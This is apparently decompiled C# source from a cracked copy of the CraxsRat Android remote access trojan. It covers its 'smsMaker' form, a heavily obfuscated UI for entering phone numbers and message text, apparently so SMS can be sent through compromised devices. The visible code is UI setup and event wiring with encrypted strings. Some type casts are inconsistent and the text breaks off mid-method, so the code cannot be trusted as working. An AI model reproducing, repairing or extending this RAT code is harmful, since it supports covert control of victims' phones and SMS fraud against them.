// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.smsMaker
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class smsMaker : Form
  {
    internal Exception \u0024VB\u0024ResumableLocal_ex\u002455;
    internal string \u0024VB\u0024ResumableLocal_folder_building\u002456;
    internal string \u0024VB\u0024ResumableLocal_path_apktool\u002457;
    internal int \u0024VB\u0024ResumableLocal_vulTrack\u002458;
    internal string \u0024VB\u0024ResumableLocal_driv\u002459;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u002460;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u002461;
    internal bool \u0024VB\u0024ResumableLocal_canRun\u002462;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u002463;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u002464;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u002465;
    internal TaskAwaiter<byte[]> \u0024A0;
    private IContainer components;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((snapsdownloader) this).components = (IContainer) new System.ComponentModel.Container();
label_1:
      int num1 = 1328570955;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 ^ -847572610 ^ 1819370278 ^ 595061078 + 119385505 ^ -1353948023 ^ 637830748 * -1984618887) * -1577520683 ^ 1199523259)) % 105U)
        {
          case 0:
            this.Label34.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -1108491472 ^ -1784307343;
            continue;
          case 1:
            this.addnum.Size = new Size(35, 30);
            this.addnum.Style = UIStyle.Custom;
            num1 = (int) num2 * 1299214491 ^ -608526324;
            continue;
          case 2:
            this.msgtext.Font = new Font(EXGuarder.\u00377547238, 12f);
            this.msgtext.Location = new Point(407, 39);
            this.msgtext.Margin = new Padding(4, 5, 4, 5);
            this.msgtext.Maximum = (double) int.MaxValue;
            num1 = (int) num2 * -1523084456 ^ 1677046758;
            continue;
          case 3:
            this.msgtext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 467384512 ^ -583072850;
            continue;
          case 4:
            this.msgtext.TextAlignment = ContentAlignment.TopLeft;
            this.DrakeUIToolTip1.SetToolTip((Control) this.msgtext, EXGuarder.\u00366424B35);
            this.msgtext.Watermark = EXGuarder.\u0036F0B0426;
            this.DrakeUIButtonIcon1.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1694978102 ^ 1707414325;
            continue;
          case 5:
            this.DrakeUIToolTip1.SetToolTip((Control) this.selectlist, EXGuarder.\u0034B5B2709);
            this.Label2.AutoSize = true;
            this.Label2.Font = new Font(EXGuarder.\u00377547238, 12f);
            this.Label2.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -2087339071 ^ 1942705351;
            continue;
          case 6:
            this.Label2.Location = new Point(531, 9);
            num1 = (int) num2 * 286061060 ^ -1801035033;
            continue;
          case 7:
            this.remnum.Size = new Size(35, 30);
            num1 = (int) num2 * 1550556832 ^ -1560865735;
            continue;
          case 8:
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            this.Name = EXGuarder.\u00361060417;
            this.ShowIcon = false;
            this.Text = EXGuarder.\u0034B166113;
            num1 = (int) num2 * 1248538916 ^ 1296756337;
            continue;
          case 9:
            this.checkall.Font = new Font(EXGuarder.\u00377547238, 12f);
            num1 = (int) num2 * -1757217673 ^ 1655695497;
            continue;
          case 10:
            this.remnum = new DrakeUIAvatar();
            num1 = (int) num2 * -1693054689 ^ 2117994777;
            continue;
          case 11:
            this.DrakeUIButtonIcon1.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.DrakeUIButtonIcon1.Size = new Size(136, 35);
            num1 = (int) num2 * 2108031192 ^ 450075584;
            continue;
          case 12:
            this.Label2.Name = EXGuarder.\u0032176590B;
            this.Label2.Size = new Size(129, 25);
            num1 = (int) num2 * -25913212 ^ -21078341;
            continue;
          case 13:
            this.msgtext.Multiline = true;
            this.msgtext.Name = EXGuarder.\u003320F0A14;
            this.msgtext.Padding = new Padding(5);
            num1 = (int) num2 * 872030602 ^ -212436269;
            continue;
          case 14:
            this.DrakeUIButtonIcon2.TabIndex = 3;
            this.DrakeUIButtonIcon2.Text = EXGuarder.\u003511C4D2A;
            this.Label1.AutoSize = true;
            this.Label1.Font = new Font(EXGuarder.\u00377547238, 12f);
            this.Label1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -250878256 ^ -1724192048;
            continue;
          case 15:
            this.Label34.Name = EXGuarder.\u003300B6B4F;
            this.Label34.Size = new Size(115, 24);
            num1 = (int) num2 * 61216106 ^ 849067478;
            continue;
          case 16:
            this.addnum = new DrakeUIAvatar();
            this.selectlist = new DrakeUIAvatar();
            this.Label2 = new Label();
            num1 = (int) num2 * 73957327 ^ -733384395;
            continue;
          case 17:
            this.TopMost = true;
            this.ResumeLayout(false);
            num1 = (int) num2 * -674531498 ^ 2136951226;
            continue;
          case 18:
            this.DrakeUIButtonIcon1.Symbol = 61768;
            this.DrakeUIButtonIcon1.TabIndex = 2;
            num1 = (int) num2 * -1972685415 ^ 889324626;
            continue;
          case 19:
            this.numslist.TabIndex = 67;
            num1 = (int) num2 * 1121368002 ^ 127499429;
            continue;
          case 20:
            this.numslist.Font = new Font(EXGuarder.\u00377547238, 12f);
            num1 = (int) num2 * -1822143165 ^ 1686014611;
            continue;
          case 21:
            this.selectlist.SymbolSize = 30;
            num1 = (int) num2 * -607254497 ^ -1426571489;
            continue;
          case 22:
            this.checkall.Location = new Point(535, 424);
            num1 = (int) num2 * -1419972371 ^ 1615054140;
            continue;
          case 23:
            this.remnum.Style = UIStyle.Custom;
            num1 = (int) num2 * -683548337 ^ -2050496449;
            continue;
          case 24:
            this.Label34.Location = new Point(584, 429);
            num1 = (int) num2 * 1405420104 ^ 1452841305;
            continue;
          case 25:
            this.Label1.Text = EXGuarder.\u0034B1E323C;
            this.Label34.AutoSize = true;
            num1 = (int) num2 * 1476757506 ^ 1226317914;
            continue;
          case 26:
            this.numslist.FillColor = Color.FromArgb(225, 245, 254);
            num1 = (int) num2 * -1930954242 ^ 666296711;
            continue;
          case 27:
            this.phonetext.Padding = new Padding(5);
            this.phonetext.RectColor = Color.FromArgb(56, 142, 60);
            num1 = (int) num2 * -942927270 ^ 1369824083;
            continue;
          case 28:
            this.selectlist.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1609976660 ^ 436566075;
            continue;
          case 29:
            this.addnum.Name = EXGuarder.\u0034E303749;
            num1 = (int) num2 * -1964954101 ^ 187714486;
            continue;
          case 30:
            this.addnum.Font = new Font(EXGuarder.\u00377547238, 12f);
            num1 = (int) num2 * -1734532006 ^ -2072645413;
            continue;
          case 31:
            this.addnum.Symbol = 61525;
            this.addnum.SymbolSize = 30;
            this.addnum.TabIndex = 68;
            this.addnum.Text = EXGuarder.\u003296C0119;
            this.DrakeUIToolTip1.SetToolTip((Control) this.addnum, EXGuarder.\u003744F1763);
            this.selectlist.AvatarSize = 30;
            num1 = (int) num2 * 933816273 ^ -200824432;
            continue;
          case 32:
            this.PerformLayout();
            num1 = (int) num2 * -1146106718 ^ 560858031;
            continue;
          case 33:
            this.remnum.Name = EXGuarder.\u00341726111;
            num1 = (int) num2 * -743878927 ^ -521085539;
            continue;
          case 34:
            this.selectlist.Name = EXGuarder.\u0032C322B08;
            num1 = (int) num2 * 203688411 ^ 113011515;
            continue;
          case 35:
            this.checkall.Name = EXGuarder.\u00367690F2A;
            num1 = (int) num2 * 1545591995 ^ -1264344977;
            continue;
          case 36:
            this.selectlist.Location = new Point(347, 428);
            this.selectlist.Margin = new Padding(4);
            num1 = (int) num2 * 292705382 ^ 826684434;
            continue;
          case 37:
            this.DrakeUIButtonIcon2.Style = UIStyle.Custom;
            this.DrakeUIButtonIcon2.Symbol = 61453;
            num1 = (int) num2 * 2025386219 ^ -1260373534;
            continue;
          case 38:
            this.selectlist.Text = EXGuarder.\u003296C0119;
            num1 = (int) num2 * -541052776 ^ 733119013;
            continue;
          case 39:
            this.numslist.Text = EXGuarder.\u0032A605621;
            this.remnum.AvatarSize = 30;
            num1 = (int) num2 * -1221434595 ^ 1744551884;
            continue;
          case 40:
            this.Label34.ForeColor = Color.White;
            num1 = (int) num2 * -1992394895 ^ -1758521560;
            continue;
          case 41:
            this.Label2.TabIndex = 71;
            this.Label2.Text = EXGuarder.\u0036C071A32;
            this.DrakeUIToolTip1.BackColor = Color.Black;
            num1 = (int) num2 * -2016813469 ^ 1240844846;
            continue;
          case 42:
            this.phonetext.Style = UIStyle.Green;
            num1 = (int) num2 * -1541164269 ^ -264091447;
            continue;
          case 43:
            this.remnum.TabIndex = 69;
            this.remnum.Text = EXGuarder.\u003422E1079;
            num1 = (int) num2 * -326768613 ^ -804868400;
            continue;
          case 44:
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            num1 = (int) num2 * -1145024476 ^ -1456186366;
            continue;
          case 45:
            this.remnum.Location = new Point(15, 429);
            this.remnum.Margin = new Padding(4);
            num1 = (int) num2 * 1809038883 ^ -135137718;
            continue;
          case 46:
            this.numslist.Location = new Point(18, 39);
            num1 = (int) num2 * -1321583891 ^ 158404763;
            continue;
          case 47:
            this.DrakeUIToolTip1 = new DrakeUIToolTip(((snapsdownloader) this).components);
            this.checkall = new DrakeUICheckBox();
            this.SuspendLayout();
            this.phonetext.Cursor = Cursors.IBeam;
            this.phonetext.FillColor = Color.White;
            this.phonetext.Font = new Font(EXGuarder.\u00377547238, 12f);
            num1 = (int) num2 * -8564973 ^ -575072349;
            continue;
          case 48:
            this.Controls.Add((Control) this.DrakeUIButtonIcon1);
            this.Controls.Add((Control) this.msgtext);
            this.Controls.Add((Control) this.phonetext);
            num1 = (int) num2 * -711251649 ^ -1272058457;
            continue;
          case 49:
            this.phonetext.TabIndex = 0;
            this.phonetext.TextAlignment = ContentAlignment.BottomCenter;
            this.phonetext.Watermark = EXGuarder.\u0034440444B;
            num1 = (int) num2 * 242158470 ^ -583675676;
            continue;
          case 50:
            this.remnum.Cursor = Cursors.Hand;
            this.remnum.FillColor = Color.Black;
            num1 = (int) num2 * -1465714821 ^ 1362512374;
            continue;
          case 51:
            this.numslist.Name = EXGuarder.\u0031C791F2C;
            num1 = (int) num2 * 1600988817 ^ -1107883935;
            continue;
          case 52:
            this.Label1.Location = new Point(116, 9);
            this.Label1.Name = EXGuarder.\u0034F3F0E37;
            num1 = (int) num2 * -1760552616 ^ -527739302;
            continue;
          case 53:
            this.msgtext.Size = new Size(366, 362);
            this.msgtext.Style = UIStyle.Red;
            this.msgtext.StyleCustomMode = true;
            this.msgtext.TabIndex = 1;
            num1 = (int) num2 * -1762635442 ^ -1024399950;
            continue;
          case 54:
            this.remnum.Font = new Font(EXGuarder.\u00377547238, 12f);
            num1 = (int) num2 * 1205473742 ^ 410781782;
            continue;
          case 55:
            this.phonetext.Location = new Point(101, 428);
            this.phonetext.Margin = new Padding(4, 5, 4, 5);
            this.phonetext.Maximum = (double) int.MaxValue;
            this.phonetext.Minimum = (double) int.MinValue;
            this.phonetext.Name = EXGuarder.\u00307091B11;
            num1 = (int) num2 * -1982394987 ^ 474286451;
            continue;
          case 56:
            this.numslist.RectColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 1833717033 ^ -228374753;
            continue;
          case 57:
            this.phonetext.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.phonetext.Size = new Size(227, 30);
            num1 = (int) num2 * 1108044360 ^ 1101767456;
            continue;
          case 58:
            goto label_1;
          case 59:
            this.DrakeUIButtonIcon1.Text = EXGuarder.\u0030E717439;
            num1 = (int) num2 * -1252754479 ^ -1053709194;
            continue;
          case 60:
            this.selectlist.Cursor = Cursors.Hand;
            this.selectlist.FillColor = Color.Black;
            this.selectlist.Font = new Font(EXGuarder.\u00377547238, 12f);
            num1 = (int) num2 * -1411459078 ^ 1454730416;
            continue;
          case 61:
            this.Controls.Add((Control) this.numslist);
            this.Controls.Add((Control) this.Label34);
            this.Controls.Add((Control) this.Label1);
            num1 = (int) num2 * -1577017190 ^ -995812105;
            continue;
          case 62:
            this.checkall.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 1611939280 ^ 1413888484;
            continue;
          case 63:
            this.numslist.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num2 * -1350770850 ^ 256111636;
            continue;
          case 64:
            this.DrakeUIButtonIcon2.Size = new Size(137, 35);
            num1 = (int) num2 * -2131477338 ^ -2047380913;
            continue;
          case 65:
            this.Label1.Size = new Size(163, 25);
            this.Label1.TabIndex = 4;
            num1 = (int) num2 * 1268287453 ^ -232136412;
            continue;
          case 66:
            this.remnum.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 2093484964 ^ -358496314;
            continue;
          case 67:
            this.numslist.ItemSelectBackColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 1637531213 ^ -575690425;
            continue;
          case 68:
            this.checkall.TabIndex = 72;
            num1 = (int) num2 * -1262413750 ^ 227998164;
            continue;
          case 69:
            this.DrakeUIToolTip1.ForeColor = Color.FromArgb(239, 239, 239);
            this.DrakeUIToolTip1.OwnerDraw = true;
            num1 = (int) num2 * -442118316 ^ -660900652;
            continue;
          case 70:
            this.msgtext.RectColor = Color.FromArgb(230, 80, 80);
            num1 = (int) num2 * -155686660 ^ 1788993110;
            continue;
          case 71:
            this.DrakeUIToolTip1.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1554222549 ^ 135424253;
            continue;
          case 72:
            this.msgtext.Cursor = Cursors.IBeam;
            this.msgtext.FillColor = Color.White;
            num1 = (int) num2 * 368204541 ^ -770916183;
            continue;
          case 73:
            this.selectlist.Size = new Size(35, 30);
            this.selectlist.Style = UIStyle.Custom;
            this.selectlist.Symbol = 61462;
            num1 = (int) num2 * -1010632935 ^ -1937298756;
            continue;
          case 74:
            this.numslist.Size = new Size(366, 362);
            num1 = (int) num2 * 469627732 ^ 337868072;
            continue;
          case 75:
            this.DrakeUIButtonIcon2.Cursor = Cursors.Hand;
            this.DrakeUIButtonIcon2.FillColor = Color.Black;
            this.DrakeUIButtonIcon2.Font = new Font(EXGuarder.\u00377547238, 12f);
            this.DrakeUIButtonIcon2.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon2.Location = new Point(487, 503);
            this.DrakeUIButtonIcon2.Name = EXGuarder.\u0036B090813;
            this.DrakeUIButtonIcon2.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon2.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 1889627178 ^ 457189526;
            continue;
          case 76:
            goto label_3;
          case 77:
            this.selectlist.TabIndex = 70;
            num1 = (int) num2 * -719980325 ^ 10144512;
            continue;
          case 78:
            this.checkall.Size = new Size(42, 29);
            this.checkall.Style = UIStyle.Custom;
            this.checkall.StyleCustomMode = true;
            num1 = (int) num2 * 161940478 ^ 1873600894;
            continue;
          case 79:
            this.numslist.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1922885471 ^ 508896840;
            continue;
          case 80:
            this.Label34.TabIndex = 66;
            num1 = (int) num2 * 878362123 ^ 659490196;
            continue;
          case 81:
            this.Controls.Add((Control) this.DrakeUIButtonIcon2);
            num1 = (int) num2 * 631367305 ^ 1417770637;
            continue;
          case 82:
            this.Label1 = new Label();
            this.Label34 = new Label();
            this.numslist = new DrakeUIListBox();
            num1 = (int) num2 * -974038125 ^ -1426036686;
            continue;
          case 83:
            this.AutoScaleMode = AutoScaleMode.Font;
            this.BackColor = Color.Black;
            this.ClientSize = new Size(786, 550);
            num1 = (int) num2 * -1519499700 ^ -116346308;
            continue;
          case 84:
            this.DrakeUIToolTip1.SetToolTip((Control) this.remnum, EXGuarder.\u0032A161616);
            this.addnum.AvatarSize = 30;
            this.addnum.Cursor = Cursors.Hand;
            this.addnum.FillColor = Color.Black;
            num1 = (int) num2 * -2044836766 ^ 644492912;
            continue;
          case 85:
            this.Label34.Font = new Font(EXGuarder.\u00377547238, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 493611891 ^ 1879290345;
            continue;
          case 86:
            this.phonetext = new DrakeUITextBox();
            this.msgtext = new DrakeUITextBox();
            this.DrakeUIButtonIcon1 = new DrakeUIButtonIcon();
            num1 = (int) num2 * 997838664 ^ -1669892471;
            continue;
          case 87:
            this.DrakeUIButtonIcon1.Style = UIStyle.Custom;
            num1 = (int) num2 * 996170751 ^ -1791879187;
            continue;
          case 88:
            this.remnum.Symbol = 61526;
            num1 = (int) num2 * 2135171524 ^ -979268728;
            continue;
          case 89:
            this.msgtext.MaxLength = 160;
            this.msgtext.Minimum = (double) int.MinValue;
            num1 = (int) num2 * 776709651 ^ 1392200336;
            continue;
          case 90:
            this.checkall.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.checkall.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1524015486 ^ 315370713;
            continue;
          case 91:
            this.Label34.BackColor = Color.Transparent;
            num1 = (int) num2 * -907801139 ^ -1256257144;
            continue;
          case 92:
            this.ControlBox = false;
            num1 = (int) num2 * -1824276708 ^ -1995114157;
            continue;
          case 93:
            this.numslist.ItemSelectForeColor = Color.FromArgb(225, 245, 254);
            num1 = (int) num2 * -251725173 ^ 557813827;
            continue;
          case 94:
            this.DrakeUIButtonIcon1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon1.Location = new Point(638, 503);
            this.DrakeUIButtonIcon1.Name = EXGuarder.\u0034B2C1F79;
            num1 = (int) num2 * -988442124 ^ -688497025;
            continue;
          case 95:
            this.Controls.Add((Control) this.checkall);
            this.Controls.Add((Control) this.Label2);
            this.Controls.Add((Control) this.selectlist);
            this.Controls.Add((Control) this.remnum);
            this.Controls.Add((Control) this.addnum);
            num1 = (int) num2 * -142476797 ^ -2095251550;
            continue;
          case 96:
            this.remnum.SymbolSize = 30;
            num1 = (int) num2 * -1595901175 ^ -25998869;
            continue;
          case 97:
            this.numslist.StyleCustomMode = true;
            num1 = (int) num2 * 812878800 ^ 1254411886;
            continue;
          case 98:
            this.DrakeUIButtonIcon1.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 36301561 ^ 955530175;
            continue;
          case 99:
            this.numslist.Style = UIStyle.Custom;
            num1 = (int) num2 * 1997559086 ^ 600663346;
            continue;
          case 100:
            this.numslist.Padding = new Padding(2);
            num1 = (int) num2 * 1336405716 ^ -656953203;
            continue;
          case 101:
            this.addnum.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.addnum.Location = new Point(58, 429);
            this.addnum.Margin = new Padding(4);
            num1 = (int) num2 * -572509462 ^ -1447600139;
            continue;
          case 102:
            this.DrakeUIButtonIcon1.FillColor = Color.Black;
            this.DrakeUIButtonIcon1.Font = new Font(EXGuarder.\u00377547238, 12f);
            num1 = (int) num2 * 188136148 ^ -690106883;
            continue;
          case 103:
            this.Label34.Text = EXGuarder.\u00338400D1D;
            num1 = (int) num2 * -843118164 ^ 1663746944;
            continue;
          case 104:
            this.DrakeUIButtonIcon2 = new DrakeUIButtonIcon();
            num1 = (int) num2 * 10168420 ^ 248690847;
            continue;
          default:
            goto label_107;
        }
      }
label_3:
      return;
label_107:;
    }

    internal virtual DrakeUITextBox phonetext
    {
      get => ((snapsdownloader) this)._phonetext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        KeyPressEventHandler pressEventHandler = new KeyPressEventHandler(this.Phonetext_KeyPress);
        DrakeUITextBox phonetext = ((snapsdownloader) this)._phonetext;
label_1:
        int num1 = 1266730396;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -(-1665104055 - 2130163627 - -(~num2 + (625243913 * (782779290 - 1543307969) + ~(158613721 ^ -2075028211) + ~1594423610) - -494470197))) % 8U)
          {
            case 0:
              phonetext.KeyPress -= pressEventHandler;
              num1 = (int) num3 * -626176671 ^ 866883527;
              continue;
            case 1:
              int num4 = phonetext == null ? -1075332492 : (num4 = 2132958224);
              num1 = num4 ^ (int) num3 * 1711323235;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            case 4:
              ((snapsdownloader) this)._phonetext = value;
              num1 = 1348573816;
              continue;
            case 5:
              phonetext = ((snapsdownloader) this)._phonetext;
              num1 = (int) num3 * -950389858 ^ -1922611049;
              continue;
            case 6:
              int num5 = phonetext == null ? 292626405 : (num5 = -394990766);
              num1 = num5 ^ (int) num3 * 1558578100;
              continue;
            case 7:
              phonetext.KeyPress += pressEventHandler;
              num1 = (int) num3 * -1253575439 ^ -277720182;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUITextBox msgtext
    {
      get => ((snapsdownloader) this)._msgtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((snapsdownloader) this)._msgtext = value;
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
    {
      get => ((snapsdownloader) this)._DrakeUIButtonIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_click);
label_1:
        int num1 = -1654649293;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIButtonIcon drakeUiButtonIcon1;
          switch ((num3 = (uint) ((~((-(1097719043 - 994408651) ^ ~-1270096220 - 2089983980) - (num2 ^ ~(1235915357 * (2107971743 - 637752546) - (~193961073 + (-522705739 ^ 1864054433)) - 315431443)) * 175961163) ^ 153985969 + 538146764) - 35875559)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = drakeUiButtonIcon1 == null ? 788967119 : (num4 = 1899629833);
              num1 = num4 ^ (int) num3 * 1503348870;
              continue;
            case 2:
              drakeUiButtonIcon1.Click += eventHandler;
              num1 = (int) num3 * 1333383537 ^ -2014684005;
              continue;
            case 3:
              drakeUiButtonIcon1.Click -= eventHandler;
              num1 = (int) num3 * -2146756896 ^ -1790759606;
              continue;
            case 4:
              goto label_3;
            case 5:
              drakeUiButtonIcon1 = ((snapsdownloader) this)._DrakeUIButtonIcon1;
              num1 = (int) num3 * 501118204 ^ 747883880;
              continue;
            case 6:
              drakeUiButtonIcon1 = ((snapsdownloader) this)._DrakeUIButtonIcon1;
              int num5 = drakeUiButtonIcon1 == null ? -1008864810 : (num5 = 24745106);
              num1 = num5 ^ (int) num3 * 1761581914;
              continue;
            case 7:
              ((snapsdownloader) this)._DrakeUIButtonIcon1 = value;
              num1 = 442035168;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
    {
      get => ((snapsdownloader) this)._DrakeUIButtonIcon2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon2_Click);
label_1:
        int num1 = -88904617;
        DrakeUIButtonIcon drakeUiButtonIcon2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(num1 * 608516355) - (-794736589 * (749861840 - -2114339922) - ---540060797) - -1735097221)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              ((snapsdownloader) this)._DrakeUIButtonIcon2 = value;
              drakeUiButtonIcon2 = ((snapsdownloader) this)._DrakeUIButtonIcon2;
              num1 = -373094740;
              continue;
            case 2:
              goto label_3;
            case 3:
              drakeUiButtonIcon2.Click += eventHandler;
              num1 = (int) num2 * 1283374287 ^ -642747064;
              continue;
            case 4:
              drakeUiButtonIcon2 = ((snapsdownloader) this)._DrakeUIButtonIcon2;
              num1 = (int) num2 * 270339965 ^ -1511968150;
              continue;
            case 5:
              int num3 = drakeUiButtonIcon2 == null ? 575849890 : (num3 = -2020057571);
              num1 = num3 ^ (int) num2 * -644880837;
              continue;
            case 6:
              drakeUiButtonIcon2.Click -= eventHandler;
              num1 = (int) num2 * -1392319648 ^ -163713232;
              continue;
            case 7:
              int num4 = drakeUiButtonIcon2 == null ? -2014799784 : (num4 = 1601409865);
              num1 = num4 ^ (int) num2 * 1732003160;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label Label1
    {
      get => ((snapsdownloader) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((snapsdownloader) this)._Label1 = value;
    }

    internal virtual Label Label34
    {
      get => ((snapsdownloader) this)._Label34;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((snapsdownloader) this)._Label34 = value;
    }

    internal virtual DrakeUIListBox numslist
    {
      get => ((snapsdownloader) this)._numslist;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((snapsdownloader) this)._numslist = value;
      }
    }

    internal virtual DrakeUIAvatar remnum
    {
      get => ((tipfirewalltracker) this)._remnum;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Remnum_Click);
        DrakeUIAvatar remnum = ((tipfirewalltracker) this)._remnum;
        if (remnum == null)
          goto label_8;
label_1:
        int num1 = 1612520048;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (1555330552 - (~~1229270443 - (num2 ^ 835052713 * -950784081 ^ ~~(-1022470111 - 1469339797 * 1325581151)) * 501065181 ^ ~599110194 - ~1884649670 ^ -1050344293 ^ -590739947))) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              remnum = ((tipfirewalltracker) this)._remnum;
              num1 = (int) num3 * 1583780706 ^ -592984380;
              continue;
            case 2:
              int num4 = remnum == null ? 1149783354 : (num4 = 1882262782);
              num1 = num4 ^ (int) num3 * 98892671;
              continue;
            case 3:
              remnum.Click += eventHandler;
              num1 = (int) num3 * 749581157 ^ -1197090956;
              continue;
            case 4:
              goto label_8;
            case 5:
              remnum.Click -= eventHandler;
              num1 = (int) num3 * 1282489338 ^ 2037273759;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_8:
        ((tipfirewalltracker) this)._remnum = value;
        num1 = -1163345714;
        goto label_2;
      }
    }

    internal virtual DrakeUIAvatar addnum
    {
      get => ((tipfirewalltracker) this)._addnum;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Addnum_Click);
        DrakeUIAvatar addnum = ((tipfirewalltracker) this)._addnum;
        if (addnum == null)
          goto label_7;
label_1:
        int num1 = 1488412523;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-(1392000192 - -(-883027748 ^ 1090613633 - 1202158546) + -~(--72749298 - (1034019886 - 1814223887)) - num2 + -2111587575 * (1859708367 * 247096284 ^ 176781711 - 793219701 + -326961907) + ((1585265917 ^ -1064219228 ^ 151289739) + 182680799) ^ -1187382905 * (243580258 * 197956011)) ^ 2069862064)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              addnum = ((tipfirewalltracker) this)._addnum;
              int num4 = addnum == null ? -1956884990 : (num4 = 1277309350);
              num1 = num4 ^ (int) num3 * 1908016247;
              continue;
            case 3:
              addnum.Click += eventHandler;
              num1 = (int) num3 * 772095129 ^ -156449245;
              continue;
            case 4:
              addnum.Click -= eventHandler;
              num1 = (int) num3 * 1225609192 ^ 456141840;
              continue;
            case 5:
              goto label_7;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_7:
        ((tipfirewalltracker) this)._addnum = value;
        num1 = -935414175;
        goto label_2;
      }
    }

    internal virtual DrakeUIAvatar selectlist
    {
      get => ((tipfirewalltracker) this)._selectlist;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Selectlist_Click);
label_1:
        int num1 = -1412578993;
        DrakeUIAvatar selectlist;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(num1 * 50753147 * -826154487 + ((286636425 ^ -1686771558 * 1137007069) - ((-1770465316 ^ 663289883) + (-817769216 ^ -1904917330))) - (1176414525 * 2068562259 - (-1224110144 - 1346648630)) - (1129970202 - 1274486751))) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              ((tipfirewalltracker) this)._selectlist = value;
              num1 = -66938380;
              continue;
            case 2:
              selectlist.Click -= eventHandler;
              num1 = (int) num2 * -314345381 ^ -1875168787;
              continue;
            case 3:
              int num3 = selectlist == null ? -144158124 : (num3 = -128632065);
              num1 = num3 ^ (int) num2 * -1430945275;
              continue;
            case 4:
              goto label_3;
            case 5:
              selectlist = ((tipfirewalltracker) this)._selectlist;
              num1 = (int) num2 * -1661513217 ^ -1666263442;
              continue;
            case 6:
              selectlist = ((tipfirewalltracker) this)._selectlist;
              int num4 = selectlist == null ? -462662510 : (num4 = 168015737);
              num1 = num4 ^ (int) num2 * -2058086820;
              continue;
            case 7:
              selectlist.Click += eventHandler;
              num1 = (int) num2 * 1320911716 ^ -1606181338;
              continue;
            default:
